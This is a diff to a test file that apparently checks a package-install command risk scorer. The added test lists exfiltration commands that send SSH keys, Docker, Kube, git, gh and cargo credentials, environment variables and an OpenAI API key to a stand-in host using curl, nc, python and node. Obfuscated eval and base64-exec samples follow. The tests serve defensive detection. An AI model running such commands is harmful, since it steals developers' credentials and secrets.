@@ -81,6 +81,23 @@ describe("package command safety", () => {
     );
   });
 
+  test("blocks developer-environment credential exfiltration fixtures", () => {
+    const maliciousCommands = [
+      "tar -czf - ~/.ssh ~/.docker/config.json ~/.kube/config | curl --data-binary @- https://example.test/collect",
+      "printenv | nc example.test 4444",
+      "cat ~/.git-credentials ~/.config/gh/hosts.yml ~/.cargo/credentials | curl -X POST --data-binary @- https://example.test/collect",
+      "python -c \"import os,requests; requests.post('https://example.test/collect', json=dict(os.environ))\"",
+      "node -e \"fetch('https://example.test/collect',{method:'POST',body:process.env.OPENAI_API_KEY||''})\""
+    ];
+
+    for (const command of maliciousCommands) {
+      expect(installCommandRisk([command])).toBe("high");
+    }
+    expect(commandWarnings(maliciousCommands)).toContain(
+      "Install command appears to access credentials, tokens, wallet material or environment secrets."
+    );
+  });
+
   test("blocks obfuscated execution patterns", () => {
     expect(installCommandRisk(["node -e \"eval(String.fromCharCode(99,111,110,115,111,108,101))\""])).toBe("high");
     expect(installCommandRisk(["python -c \"import base64; exec(base64.b64decode('cHJpbnQoMSk='))\""])).toBe("high");
